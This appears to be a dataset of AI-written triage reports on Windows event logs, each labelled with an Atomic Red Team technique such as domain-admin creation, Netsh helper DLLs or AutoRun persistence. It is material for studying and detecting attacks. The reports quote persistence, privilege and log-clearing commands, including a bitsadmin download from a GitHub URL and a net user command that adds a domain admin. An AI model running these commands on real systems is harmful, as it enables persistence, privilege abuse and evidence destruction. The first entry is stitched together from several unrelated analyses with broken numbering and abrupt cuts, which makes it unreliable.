These actions will help clarify whether these activities were benign yet unusually handled tasks, or if they indeed represent a security breach. It’s crucial to document any further findings and adjust security controls accordingly."
Auto-start application on user logon,"Upon reviewing the provided Windows event logs, several activities are flagged that require closer examination.

1. **Clearing of event logs**:
   - In the **System log**, Event ID 104 and in the **Security log**, Event ID 1102 indicate that event logs have been cleared by the user `admin_test` (`LogFileCleared` for System, and `LogFileCleared` for Security). This activity stands out as suspicious because clearing logs can be an attempt to cover tracks of malicious activities.

2. **Unusual Registry Modifications**:
   - In the **Sysmon log**, the use of `reg.exe` to add multiple registry keys under `""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility""` with entries related to `malware_test` suggests potentially malicious behavior. This pattern is often associated with persistence mechanisms where malware may set up keys to ensure it maintains execution privileges on the system.

3. **Command-Line Execution**:
   - **Sysmon logs** (EventID: 1): Execution of `cmd.exe` with a complex command line that modifies registry settings for potentially malicious purposes. This type of command line execution is unusual for standard practices and raises red flags for potential system compromise or at least unauthorized configuration changes.

4. **Repeated Execution of Processes**:
   - There are numerous instances of `C:\\Windows\\System32\\cmd.exe` and `C:\\Windows\\System32\\reg.exe` executions, often tied to the suspicious registry modifications processes described above.

5. **Time Synchronization Changes**:
   - Several logs reflect changes in system time. While time synchronization per se isn't directly malicious, changes in system timestamps can be leveraged in orchestrating an attack, especially to bypass certain security controls or logging analyses.

**Assessment**:
- The presence of log clearing actions, unusual registry manipulations, and complex command executions leads to a conclusion that these logs indicate potential malicious activity.

**Resolution**:
- **MALICIOUS** - The activities in the logs display clear signs of potential compromise, especially with the malicious intents observed both in registry changes and log clearance attempts.

**Guidance**:
1. **Immediate Containment**: Isolate the affected system to prevent any potential spread of malicious activity.
2. **Detailed Investigation**: Conduct a thorough investigation into the `admin_test` account to verify any unauthorized privileges or compromise.

### Detailed Analysis

1. **Windows PowerShell Log:**
   - **Events:** Multiple events showing PowerShell commands being executed.
   - **Suspicious Activity:** The logs capture attempts to modify the PowerShell profile to include a command to start Calculator (calc.exe). The command-line captured in the logs is indicative of an attempt to run a script or command automatically whenever PowerShell is started. This kind of behavior can be suspicious as attackers often try to maintain persistence by adding malicious commands to user profiles.
   - **Command Breakdown:**
     - The command `Add-Content $profile -Value ""Start-Process calc.exe""` is likely aimed at ensuring Calculator is launched every time PowerShell is opened.
     - The presence of commands to modify `$profile` is suspicious unless done with justified administrative purpose, possibly indicating attempted persistence by an unauthorized script.

2. **Security Log:**
   - **Event 1102:** The security log shows an event log clearing operation, logged by the user ""admin_test"" on `2024-10-27 14:48:54.5491595`.
   - **Event ID 4672:** Demonstrates special privileges being assigned to a process, which may be typical for administrative processes but are worth correlating with other activities.
   - **Suspicious Activity:** Clearing event logs can be a malicious action to cover tracks after unauthorized changes or bad activities have been done. The user ""admin_test"" conducted this action, which is highly suspicious.

3. **Sysmon Log:**
   - **Process Creation Events:**
     - Several processes tied to PowerShell execution and event log clearing utilities (`wevtutil.exe`) are observed around the same timestamp as the log clearings and suspicious PowerShell activity.
     - Process ID 5332 corresponds with the action of clearing event logs, correlating back with the clearing operation noted in system and security logs.
     - The execution of `wevtutil.exe` indicates a deliberate action to clear specific logs.
   - **Suspiciously Executed Processes:** Usage of system utilities like `wevtutil.exe` to clear logs is usually associated with malicious activity seeking to hide traces.

4. **System Log:**
   - **Event ID 104:** Log clear events are evident in the system logs, with ""admin_test"" clearing both System and Windows PowerShell channels.
   - Clearing administrative logs without legitimate reason is a red flag, indicating potential cover-up of malicious activities.
   
5. **Application Log:**
   - Primarily benign activities related to service stops and starts, with no evident malicious indicators.

### Conclusion

Based on the analysis of the logs, the following assessments are made:

- **Persistent Modification:** The PowerShell logs indicate potentially malicious activity aimed at persistence via profile modification.
- **Log Clearing:** There's clear evidence of logs being cleared without legitimate administrative reasons.
- **Use of Admin Account:** Actions were performed using an administrative account, suggesting possible misuse of credentials or account compromise.

     - System (EventID: 104) - Cleared by user 'admin_test'
     - Security (EventID: 1102) - Cleared by 'admin_test'
   - Clearing logs, particularly security logs, is suspicious as it may indicate attempts to hide malicious activity.

2. **Sysmon Logs Indicate Potential Misuse of `wevtutil`:**
   - Multiple instances of `wevtutil.exe` being executed with the `cl` (clear) command indicate the deliberate clearing of event logs. This aligns with the cleared logs observed in the security and system logs.

3. **Execution of `cmd.exe` with Suspicious Command Line Arguments:**
   - Execution of a command involving `bitsadmin.exe` to download a script from an internet location:
     - `""cmd.exe"" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1`
   - This activity is highly suspicious as it involves downloading potentially malicious script files, which is a known tactic, technique, and procedure (TTP).

**Assessment of the Situation:**

- The evidence indicates that there may have been an attempt to compromise the system. The consistent clearing of event logs is a strong indicator of efforts to conceal activity.
- The use of `bitsadmin` to download a file from a GitHub repository linked with atomic-red-team, known for testing attack simulations, suggests potential tests of malicious activities, or possibly real activity cloaked as such.
   
**Resolution: MALICIOUS**

The combination of log clearing, suspicious command-line activity, and external script downloads are definitive indicators of malicious behavior. Immediate incident response actions should be taken.

**Guidance on How to Proceed:**

1. **Containment:**
   - Isolate Server002 from the network to prevent any further potential malicious activity.

### Security Log Analysis:
1. **Event ID 1102 - Log File Cleared:** 
   - Indicates that the security log was cleared by the user `admin_test`. Clearing event logs is often an attempt to cover tracks and may indicate malicious intent or activities that need obfuscation.

2. **Event ID 4616 - System Time Changed:**
   - The system time was modified by the `Local Service` account via the `svchost.exe` process. Changes in system time, especially when unauthorized, can indicate attempts to disrupt security monitoring or manipulate time-based events/logs.

### Sysmon Log Analysis:
3. **High Integrity Level Processes:**
   - Multiple processes, such as `wevtutil.exe`, `whoami.exe`, and `cmd.exe`, were executed with high integrity levels. 
   - The usage of `wevtutil.exe` with the command `cl` to clear logs of different channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`) is suspicious, as clearing logs can be an indication of attempts to hide activity.

4. **Execution of `cmd.exe`:**
   - A command line involving registry modification (`reg add...`) and creation of a file within `Microsoft\Outlook\VbaProject.OTM` is noted. This particular command line is part of known red team toolkits (e.g., Atomic Red Team) and could represent an attempt to persist within Outlook's Visual Basic for Applications (VBA) environment, which can be leveraged for further malicious purposes.

### System Log Analysis:
5. **Event Log Cleared:**
   - Multiple events indicating logs from different channels were cleared by the user `admin_test`. This is highly indicative of efforts to disrupt audit trails and hide potential unauthorized activities.

### Application Log:
6. **Software Protection Platform Event:**
   - Event from Software Protection Platform does not directly indicate any suspicious activity. 

### General Assessment:
The combination of cleared event logs, changed system time, execution of high-integrity processes, and the specific command lines executed strongly indicates potential malicious activities, most likely related to an attacker or unauthorized admin attempting to perform and hide unauthorized actions within the system.

### Conclusion and Recommendation:
- **Resolution: MALICIOUS**
  - The activities and patterns observed suggest malicious intent, particularly considering the systematic clearing of logs and execution of potentially harmful command lines.
  - The following steps are recommended:
    - Isolate the affected system to prevent further potential compromise.
    - Conduct a thorough forensic investigation to understand the scope and impact of the breach.
    - Review and enhance security measures, particularly focusing on auditing, log monitoring, and user account protections to prevent future incidents."
Create Symbolic Link From osk.exe to cmd.exe,"Upon analyzing the provided logs from the Windows host, several points of interest and potential indicators of malicious activity can be observed:

1. **Log Clearing Activity**: 
   - Multiple logs, including System, Windows PowerShell, and Security, have been cleared by a user with the username `admin_test`. This is captured in the events with IDs 104 (System log) and 1102 (Security log), indicating that someone attempted to cover their tracks by clearing logs. This is a significant indicator of potentially malicious activity as it is a common technique used by attackers to hide their actions on a compromised system.

2. **Suspicious Command Execution**:
   - In the Sysmon log, a process (`cmd.exe`) executed a command to take ownership of `osk.exe` (a legitimate file) and replace it with a symbolic link to `cmd.exe` (an indicator of a potential privilege escalation attempt or persistence mechanism). The command is intricate and indicates an attempt to manipulate system files to achieve elevated privileges or maintain persistence.

3. **Use of `wevtutil.exe`**:
   - Several instances of `wevtutil.exe` command line utility are observed running with the `cl` (clear) command for various logs (Sysmon, Application, Security), which support the observation of log clearing activities that imply malicious intent.

4. **Privileged Account Rights Usage**:
   - The Security log shows Event ID 4672, which logs the use of special privileges assigned to a new logon. A user `admin_test` used privileges including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are particularly sensitive and indicative of potential misuse for malicious purposes.

5. **Presence of Potential Anomaly**:
   - Time discrepancies are seen in the sequence of logs, such as changes in system time, which may suggest tampering with timestamp data to confuse timelines of activity.

Based on these observations, the provided logs contain activities that are characteristic of malicious behavior, including concealment of activity (log clearing), execution of potentially harmful commands, and utilization of high-level privileges. Therefore, the activities within these logs should be classified as:

- **MALICIOUS**

### Recommended Actions:
- Immediately isolate the affected system to prevent further potential compromise or lateral movement within the network.
- Conduct a comprehensive forensic investigation to understand the full impact and scope of the breach.
- Review access controls and privileged account activities to ensure only authorized use.
- Consider re-imaging the compromised system and restoring it from a known good backup.
- Implement enhanced monitoring and alerting for suspicious activities, especially log clearing and privilege escalations.
- Provide security awareness training focused on detecting and responding to unauthorized access and suspicious activities."
Netsh Helper DLL Registration,"To analyze the provided log entries, I have identified a sequence of suspicious events that suggest malicious activity on the host `Server002`. Here is a detailed analysis:

1. **Suspicious Process Execution and Event Log Clearing:**
   - The logs reveal the execution of `wevtutil.exe` with the command-line argument to clear logs (`cl`), specifically targeting the System, Security, and Windows PowerShell logs. 
   - These operations were performed under the account `SERVER002\admin_test` at `2024-10-27 13:43:45`.
   - The use of `wevtutil.exe` to clear logs is a common tactic used by attackers to cover their tracks by deleting evidence of their activities.
  
2. **Commands executed using cmd.exe:**
   - The command `cmd.exe /c netsh.exe add helper \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1546.007\\bin\\NetshHelper.dll\""` raises a red flag. This command attempts to add a helper DLL to Netsh, which could be a sign of privilege escalation or persistence tactic. This DLL is part of the Atomic Red Team framework, which is often used in security testing and red teaming exercises. However, if not authorized, it can be an indication of malicious activity.
   - There is also an attempt to kill Notepad using `taskkill /im notepad.exe /t /f`, which can indicate application suppression to possibly hide activities from a user's view.

3. **Use of AtomicRedTeam T1546.007 Technique:**
   - The directory `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1546.007\` found in the command logs corresponds to a test procedure for a known persistence technique (T1546.007) according to MITRE ATT&CK framework.
   - This evidence, alongside the log clearing, indicates a high likelihood of a red team or malicious activity, especially if unauthorized.

4. **Other Command Line Utilization:**
   - Execution of `HOSTNAME.EXE` and `whoami.exe` might be reconnaissance related, which could be benign under some contexts but, in conjunction with the other events, may suggest initial assessment by an intruder to understand the host environment.

**Assessment:**

Based on the evidence found in the logs, particularly the explicit log-clearing activities using `wevtutil.exe`, introduction of a DLL with Netsh, and context related to Atomic Red Team, there are clear indicators of potentially malicious activity that align with common attack behaviors.

**Resolution:** MALICIOUS

**Guidance on how to proceed:**

- **Immediate Actions:**
  - Isolate the affected system to prevent further malicious activity or lateral movement within the network.
  - Begin incident response procedures to contain, analyze, and mitigate the threat.

  - Conduct a post-mortem analysis to improve detection and response strategies.
  - Implement or enhance monitoring solutions for early detection of similar threats in the future."
Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"After a thorough analysis of the provided logs, I have identified several key activities that suggest potential malicious behavior. Here is the detailed analysis:

1. **Log Clearance**: The logs from the System and Security events have been cleared by the user `admin_test` at the same timestamp (`2024-10-27 13:57:56`). Clearing of logs is a common tactic used by attackers to cover their tracks (Event IDs 104 in the System log and 1102 in the Security log).

2. **Suspicious Process Execution**:
   - The process `cmd.exe` was executed with a command line that involves registry modifications under the path `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test`. This suggests an attempt to create a malicious persistence entry under the guise of an accessibility tool (Event ID 1 in Sysmon log).
   - The execution of `cmd.exe` appears intended to manipulate system settings and execute potentially unauthorized processes, specifically using the `atbroker` to start an unfamiliar application (`malware_test`).
   
3. **Process Relationships and Integrity**:
   - Multiple `reg.exe` and `cmd.exe` processes are tied in a chain of execution suggesting attempts to modify registry settings persistently.
   - The processes are running under high integrity levels which indicate they have elevated privileges. Running processes from high integrity level suggest unauthorized privilege escalation.

4. **Network Service and System Activity**:
   - We observe normal operational processes (`svchost.exe`, `MicrosoftEdgeUpdate.exe`, etc.) and installer activities for applications like Microsoft Edge which were conducted under `NT AUTHORITY\SYSTEM`. These activities appear legitimate and typically do not raise immediate concerns.

5. **System Time Modification**:
   - There are entries showing the system time being manipulated (Event ID 4616 in the Security log). This behavior can be used to disrupt system logging or to exploit time-sensitive operations.

Based on these observations, the key activities that stand out are the log clearing, suspicious creation and manipulation of registry entries, elevated command executions, and time modifications. These are strong indications of malicious intent, likely an attempt to establish persistence and obfuscation on the server.

### Assessment
Given the activities observed, there is sufficient evidence to classify these logs as containing malicious actions. The combination of log clearance, unauthorized registry modifications, elevated process executions, and time modifications point toward an active compromise.

### Resolution: MALICIOUS

### Guidance
1. **Immediate Action**:
   - Isolate the affected system (Server002) to prevent further unauthorized access or data exfiltration.
   - Begin a full forensic investigation to determine the scope and impact of the compromise.

2. **Remediation**:
   - Restore the system from a backup taken prior to the incident.
   - Conduct a thorough review of all administrator accounts and credentials for potential compromises.

   - Implement enhanced monitoring and logging techniques to detect and respond to such activities in the future.
   - Educate administrators about the risks and signs of such malicious activities to improve proactive detection."
COM hijacking via TreatAs,"After reviewing the event logs, I have identified several key indicators of potential malicious activity:

1. **PowerShell Activity:**
   - The Windows PowerShell logs present evidence of Registry modifications using a script which appears to be mimicking the behavior of an attack simulation tool, possibly inspired by Atomic Red Team's tests (particularly, T1546.015 - Event Triggered Execution: Component Object Model and Distributed COM). This activity is commonly used in testing scenarios but can also be indicative of exploitation tests or actual attacks if found in an unexpected environment.
   - Numerous registry keys are being manipulated to include a CLSID pointing to `scrobj.dll`, a known technique used to load and execute scripts.

2. **Log Clearing:**
   - The `wevtutil` commands in the Sysmon logs indicate the clearing of event logs (`Application`, `System`, and `Security`). This is often a potential indicator of malicious activity, as attackers might clear event logs to erase traces of their actions.

3. **Rundll32 Execution:**
   - The logs show the execution of `rundll32.exe` with the argument `-sta AtomicTest`, likely executing a malicious script via the Registry settings.

4. **Sysmon and Security Logs:**
   - Notably, there are logs related to privilege escalation and suspicious process executions like `reg.exe` and `rundll32.exe` that are linked to components potentially involved in achieving persistence.

**Assessment:**
- The combination of PowerShell scripts interacting with the registry, clearing of critical event logs, and abnormal `rundll32` invocations, strongly indicate that these actions are suspicious at best and potentially malicious especially if not part of any known testing or administrative process.

**Resolution:**
- **MALICIOUS**: The collected evidence suggests malicious activity is present. Such behavior as registry tampering, event log clearing, and script execution through `rundll32` are strong indicators of malicious intent or actions possibly compromising the system.

**Guidance:**
- Isolate the affected host immediately and perform a full forensic investigation to determine the scope of the compromise.

- Review network logs for any suspicious outbound connections associated with the affected machine.
- Notify relevant stakeholders and consider involving incident response experts to contain and remediate the situation effectively."
Adding custom debugger for Windows Error Reporting,"After analyzing the provided Windows event logs, here is the detailed assessment:

### Anomalous and Suspicious Behaviors Observed:

1. **Log Clearing**:
   - There are multiple events indicating logs have been cleared using the `wevtutil.exe` command for various logs, including `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. This action was performed by the user `admin_test`.
   - Event ID 1102 in the Security log indicates that the Security Event Log was cleared, which is a typical indicator of an attempt to cover tracks.

2. **Suspicious Command Execution**:
   - The use of `cmd.exe` to execute a command modifying the registry key `HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs` to use `notepad.exe` as a debugger is suspicious. This could be a persistence mechanism or an attempt to hijack the debugger feature for malicious purposes. This was also executed by user `admin_test`.

3. **Elevation of Privilege and Unusual Processes**:
   - The processes `whoami.exe` and `hostname.exe`, although not inherently malicious, were executed by the user `admin_test`, possibly to gather information about the current system state and environment.
   - The clearing of logs and execution of `wevtutil.exe` multiple times to clear logs indicates possible privilege escalation or misuse of administrative privileges by `admin_test`.

### Indicators of Malicious Activity:

- The primary indication of potentially malicious activity is the clearing of system logs, especially security logs, which is a classic sign of an attacker attempting to erase evidence of their actions.
- The registry modification with `reg.exe` that could be used for persistence or exploitation of another vulnerability.

### Conclusion:
The actions observed in the logs, such as log clearing by `wevtutil.exe` and suspicious registry modifications using `cmd.exe`, point towards activity that is consistent with attempts at maintaining stealth and persistence on a compromised system. Such actions are typically indicative of malicious intent.

### Resolution:
- **MALICIOUS**: The logs exhibit clear signs of malicious activities, mainly through the clearing of logs and registry modifications, which are strong indicators of a compromise.

### Guidance on How to Proceed:
1. **Isolate the Affected System**: Immediately isolate the system `Server002` from the network to prevent further potential damage or spread.
2. **Conduct Forensic Analysis**: Perform a full forensic investigation of `Server002` to determine the extent of the compromise and identify any other potential indicators of compromise.
3. **Review User Accounts and Permissions**: Review the permissions and actions of the user `admin_test` and any other accounts that may have similar patterns of suspicious activities.
4. **Apply Security Patches and Updates**: Ensure that all security patches and updates are applied to mitigate exploited vulnerabilities.
5. **Strengthen Monitoring and Logging**: Enhance security monitoring to detect similar activities in the future, including alerting for log clearing and unusual registry modifications.
6. **Evaluate Network Security**: Check for additional signs of unauthorized access or lateral movement within the network and reinforce network defenses."
Powershell Execute COM Object,"**Analysis of Logs:**

**1. Security Log:**
- **EventID 1102:** The security log being cleared is suspicious activity, often associated with an attempt to cover tracks.
- **EventID 4616:** Time changes. This could indicate an attempt at log manipulation or time-based evasion.
- **EventID 4672:** Special privileges assigned to the user `admin_test`, including `SeDebugPrivilege` which is often used for sensitive operations or malicious activity.
- **EventID 4624:** Logon events from `admin_test` using NTLM, which might be expected, but the use of it along with elevated privileges could suggest lateral movement or privilege escalation attempts.

**2. Sysmon Log:**
- Numerous appearances of `wevtutil.exe` events suggest clearing logs (`cl` command in command line; ""cl"" might stand for ""Clear""), which correlates with the Security log clearing mention earlier.
- **EventID 1 and 5:** Indicate execution of suspicious PowerShell and command-line utilities. The PowerShell command executes `cmd.exe` to run`calc.exe` through a potentially malicious script. The use of CLSID and shell execution through PowerShell can indicate code execution under system context or deliberate obfuscation.

**3. Windows PowerShell Log:**
- The use of PowerShell to instantiate a COM object (`9BA05972-F6A8-11CF-A442-00A0C90A8F39`) and execute `cmd.exe` with the `/c` flag and `calc.exe`. This is often a method used in testing or by malicious scripts to execute further payloads.

**4. System Log:**
- Clearing of system and PowerShell logs by `admin_test` is consistent with tactics to hide actions.

**Conclusion:**
Based on these observations, the logs show multiple signs of potential compromise, including:
- Clearing of logs (possibly covering tracks following malicious activity).
- Use of PowerShell for potentially unauthorized activity.
- Special privileges granted to the `admin_test` user, which could be used maliciously for privilege escalation.

**Resolution:**
- **MALICIOUS**: The evidence is consistent with malicious activity aimed at maintaining persistence, executing unauthorized commands, and attempting to hide traces by clearing various logs.

**Guidance on How to Proceed:**
1. Immediately isolate the affected host (Server002) from the network to prevent further unauthorized access or damage.
2. Conduct a thorough investigation to identify any additional compromised accounts or lateral movement within the network.
3. Review and analyze possible entry points or vulnerabilities exploited for this compromise.
4. Reset credentials and potentially revoke privileges for `admin_test` if not further justified upon deeper analysis.
5. Implement stricter logging, monitoring, and alerting to detect similar activities in the future.
6. Consider conducting a full forensic investigation to fully understand the scope of the breach and implications.
7. Educate and train users and admins on detecting and responding to such activities."
Registry key creation and-or modification events for SDB,"**Detailed Analysis:**

1. **Clear Windows Event Logs (System Log Entries 3567 and 3568, Security Log Entry 30348):**
   - The event entries indicate that the logs for the System, Windows PowerShell, and Security channels were cleared by the user `admin_test`.
   - Clearing event logs is a common action performed by malicious actors to cover their tracks after unauthorized actions have been conducted.

2. **Process and PowerShell Execution (Sysmon and Windows PowerShell Logs):**
   - There are several instances of PowerShell activity with the script executed being `New-ItemProperty` that refers to `AtomicRedTeamT1546.011`. This suggests a possible test or execution of Atomic Red Team test cases, known for simulating adversarial tactics.
   - The PowerShell script involving changes to the registry related to `AppCompatFlags` is concerning as it could be associated with persistence mechanisms or system modifications for exploitation purposes.

3. **Privilege Escalation (Security Log Entry 30352):**
   - The user `admin_test` was assigned several significant privileges, including `SeDebugPrivilege` and `SeBackupPrivilege`, which are often exploited by attackers for privilege escalation or to gain deeper access to the system.

4. **Time Manipulation (Kernel-General and Security Log Entries):**
   - The system time was manipulated (observed in the Kernel-General log entry 3569, 3570, Security log entry 30349, 30350). Time tampering is an unusual activity that can be used to disrupt audit logs or confuse forensics analysis.

5. **Sysmon Log Entries:**
   - The process executions and activities heavily involve `MicrosoftEdgeUpdate.exe` and other related Edge Update processes. The command lines primarily revolve around updates/installations for Microsoft Edge. While this could potentially be benign system update activity, combined with other suspicious activities noted, it warrants further investigation.

**Assessment:**
Based on the analysis above, there are significant indicators of potentially malicious activity. The clearing of event logs, execution of PowerShell scripts with registry modifications, manipulation of system time, and suspicious privilege assignments are all red flags that point towards unauthorized or malicious behavior.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct a thorough interview with the user `admin_test` to understand the context of these actions.
- Perform a deeper forensic analysis on the affected system to identify any unauthorized changes or hidden malicious software.
- Check for other systems in the network for similar unusual patterns to determine if this is an isolated incident.
- Review access controls and adjust privileges to ensure the principle of least privilege is adhered to.
- Explore restoring affected systems from backups taken prior to these events if unauthorized changes are confirmed."
Create a new Windows domain admin user,"### Analysis of the Provided Windows Event Logs

**1. Event Log Clearance:**
- Event ID 104 in the System log and 1102 in the Security log indicate the clearing of the event logs by the user `admin_test`. Clearing logs is a common tactic used by malicious actors to cover their tracks after compromising a system.

**2. Unusual Command Execution:**
- The Sysmon log records an execution of `wevtutil.exe` with the `cl` command targeting Application, System, and Security logs. This exact action aligns with the clearing of event logs and represents a potentially malicious activity.
- A suspicious command was run via `cmd.exe` to add a user `T1136.002_Admin` with administrative privileges:  
  `cmd.exe /c net user ""T1136.002_Admin"" ""T1136_pass123!"" /add /domain & net group ""Domain Admins"" ""T1136.002_Admin"" /add /domain`.  
  This is a clear sign of privilege escalation and user creation under potentially malicious intent.

**3. Privilege and User Activity:**
- `admin_test` was involved in high-integrity actions and commands, along with a suite of privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others. This account appears to have been involved in actions typical of administrative abuse.

**4. Microsoft Edge Update Activity:**
- Multiple entries in the Application and Sysmon logs are related to Microsoft Edge Update services. These may not directly indicate compromise since they are consistent with routine software updates. However, their temporal proximity to potentially malicious activities raises the need for correlation in broader event context to rule them out.

**5. Time Manipulation:**
- The Kernel-General entries and corresponding Event ID 4616 indicate a discrepancy in system time synchronization. Although not uncommon, it could be exploited for evading time-based event correlation, but further analysis is needed to determine if this is maliciously leveraged.

### Assessment of the Situation

**Indicators of Malicious Activity:**
- Log clearing actions without corresponding legitimate cause.
- Unusual and unauthorized user account creation with domain admin privileges.
- The potential abuse of an account (`admin_test`) involved in these activities.

Based on the analysis, this pattern of activity strongly suggests malicious behavior and potentially unauthorized access.

### Final Resolution

- **Resolution: MALICIOUS**

### Guidance

- Immediate containment actions such as isolating the host from the network.
- Investigate all related accounts (`admin_test` and newly created `T1136.002_Admin`) for unauthorized changes or misuse.
- Ensure system time integrity and validate against known timelines.
- Review practices regarding access privileges and consider more stringent audit logging policies.
- Conduct a full forensic analysis to understand the extent of the breach and initiate incident response protocols to remediate.
- Revoke and reset affected credentials and implement compensatory controls to prevent future unauthorized access."
HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"Upon inspection of the provided logs, we identify several key entries and their implications:

1. **Clearing of Event Logs (Security and System):**
   - Event ID 1102 in the Security log indicates that the security audit log was cleared. This action was performed by the user `admin_test` on `SERVER002`. Additionally, the System log shows similar log clearing (Event ID 104), again by `admin_test`. Clearing of logs, especially without an apparent administrative need, is a common tactic used by malicious actors to erase traces of suspicious or unauthorized activity.

2. **Time Change in System Log:**
   - Event ID 4616 in the Security log and related Kernel-General log entries indicate a modification in the system time. Time manipulation could be an attempt to alter time stamps to confuse log timelines or evade detection methods based on time correlation.

3. **Suspicious PowerShell Activity:**
   - PowerShell logs and Sysmon logs show execution of a PowerShell command altering the registry with the command: 
     ```
     New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""notepad.exe""
     ```
     This command modifies the Windows AutoRun setting, potentially setting up a mechanism for persistence that automatically launches `notepad.exe` on command processor initiation, which could be replaced with a malicious executable.

4. **Frequent Execution of System Tools:**
   - Execution of utilities like `wevtutil.exe`, `wevtutil.exe`, `wsmprovhost.exe`, `whoami.exe`, and `hostname.exe` is observed. While these tools are legitimate, their repetitive and overlapping execution suggests they might be used to collect information about the session environment and possible reconnaissance or lateral movement within the network.

5. **Microsoft Edge Update Activities:**
   - Multiple logs related to `MicrosoftEdgeUpdate.exe` can be seen, performing legitimate update tasks. However, due to the context of other suspicious behavior, ensure the process is not used as a staging point or cover for malicious activities.

**Assessment:**

The combination of cleared logs, suspicious PowerShell usage for altering execution policies, potential time-tampering, and information-gathering commands form a pattern indicative of potentially malicious activities rather than benign administrative tasks.

**Resolution:**
- **MALICIOUS**: The logs exhibit definite signs of malicious behavior that align with common practices for establishing persistence, covering tracks, and possibly staging an attack.

**Guidance:**
1. Immediately conduct a thorough security review of the account `admin_test` and consider isolating the affected host for a more in-depth forensic analysis.
2. Review changes to group policies and other critical system settings.
3. Examine the environment for additional unauthorized changes or signs of lateral movement.
4. Reinforce security policies and ensure staff is aware of risks related to PowerShell misuse and privileged account monitoring.
5. Consider deploying enhanced logging and real-time monitoring solutions to detect and prevent such incidents in future.

**Immediate incident response** is advised to mitigate further risk and ascertain the full scope of this incident."
Change Default File Association,"### Analysis

Upon reviewing the provided log entries from the Windows host, the following points of interest and potential indicators of anomalous activities have been identified:

1. **Log Clearing Activity**:
   - There are multiple instances of log file clearing events, specifically `Event ID 1102` from the Security log and `Event ID 104` in the System log. These indicate that the event logs have been cleared by the user `admin_test` on `SERVER002`.
   - The command used (`wevtutil.exe cl [log name]`) to clear logs is executed frequently in a short time span, which is often an attempt to cover tracks after potentially malicious actions.

2. **Execution of Event Log Utility `wevtutil.exe`**:
   - The logs show repeated use of `wevtutil.exe` to clear different logs: `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `System`, and `Windows PowerShell`.
   - While `wevtutil.exe` is a legitimate utility, its use to clear logs is suspicious if not associated with routine log maintenance or administration, especially when coupled with no other administrative task explanations.

3. **Execution of `cmd.exe` with Suspicious Command**:
   - The execution of `cmd.exe` with the command line argument `assoc .hta=txtfile` suggests changing the file association of HTA files (HTML applications) to open as text files, possibly to circumvent security restrictions, indicating potentially suspicious behavior.

4. **Use of `whoami.exe`**:
   - The `whoami.exe` tool was used, which is a legitimate command but its frequent use from an administrative context (`admin_test`) can often form part of recon activity to understand user permissions, potentially indicating privilege overuse or lateral movement reconnaissance.

### Assessment

Based on the above observations, the Windows event logs contain multiple indicators of suspicious activity:

- **Frequent and unexplained clearing of event logs** is a strong indicator of an attempt to hide actions, frequently associated with malicious intent.
- **Command-line tools (`wevtutil.exe`, `cmd.exe`, `whoami.exe`) used in a sequence** that suggests a potential attempt to enumerate system utilities, modify configurations, or cover malicious actions.

### Conclusion

**Resolution: SUSPICIOUS**

The activity observed in these logs is not outrightly malicious but is deeply suspicious and could suggest nefarious actions attempted by a user with administrative privileges. The log entries suggest potential tampering and concealment activities which are concerning and warrant further investigation.

### Next Steps

1. **Conduct a deeper investigation** on the user `admin_test` to determine if their actions were authorized or potentially malicious.
2. **Review system integrity and recent changes**, focusing on policy changes and unauthorized access or modifications.
3. **Perform a full security audit**, including user access reviews, system configurations, and check for any signs of additional malicious artifacts on the system.
4. **Enhance monitoring and logging policies** to capture more information regarding log clearing activities and command-line executions in the future.
5. **Consider immediate incident response actions** if further suspicious or outrightly malicious activity is identified during the follow-up investigation."
Install Outlook Home Page Persistence,"Based on the analysis of the provided Windows event logs, a number of activities suggest potentially suspicious or malicious behavior. Here's a detailed breakdown of the findings:

### Indicators of Suspicious or Malicious Activity:

1. **Log Clearing Events:**
   - Multiple events of clearing logs (Event ID 104 in the System log and Event ID 1102 in the Security log) by the user `admin_test` using the `wevtutil` utility are present. Log clearing is often performed to cover tracks after suspicious activities.

2. **Processes Execution through `wevtutil`:**
   - The `wevtutil.exe` utility is used frequently and repeatedly in rapid succession to clear multiple event logs (Sysmon, Security, System, and PowerShell channels). While legitimate for maintenance, this pattern matches common methods of anti-forensics to avoid detection post-compromise.

3. **Registry Modification via CMD/REG:**
   - There is a modification of the registry concerning Outlook WebView, pointing to a seemingly local file (`AtomicRedTeam\T1137.004\src\T1137.004.html`). This could indicate an attempt to introduce a malicious payload or redirect/instruct Outlook to load potentially harmful local resources, leveraging a technique often associated with attacks like registry persistence or misdirection.

4. **Execution of Admin Commands:**
   - The `whoami.exe` is used, which on its own is harmless, but coupled with the other activities, it can indicate reconnaissance activity by an attacker to understand the current privileges.

5. **Anomalous Process Parentage and Execution:**
   - Processes like `cmd.exe` and `reg.exe` as children of malicious activities (log clearing and registry modification) provide further evidence of suspicious behavior.
   - The rapid sequence of process executions with high integrity levels could suggest an attempted privilege escalation.

### Assessment of the Situation:
The sequence of events involving aggressive log clearing, registry modification actions, and the type of utilities and commands used strongly suggest that these logs contain clear indicators of potentially malicious actions. Specifically, the tools and techniques are reflective of typical attacker behavior aiming to maintain persistence, evade detection, and manipulate system configurations for exploit purposes.

### Resolution:
- **MALICIOUS**: The logs demonstrate a sequence of activity commonly associated with malicious behavior, particularly aimed at concealing unauthorized actions, manipulating system functionality, and possibly executing or injecting malicious content.

### Guidance on How to Proceed:
1. **Immediate Containment**: Recommend isolating the affected host from the network to prevent further malicious activity or spread.
2. **Full Forensic Investigation**: Conduct a deeper forensic investigation to determine the extent of the compromise and identify all impacted systems and data.
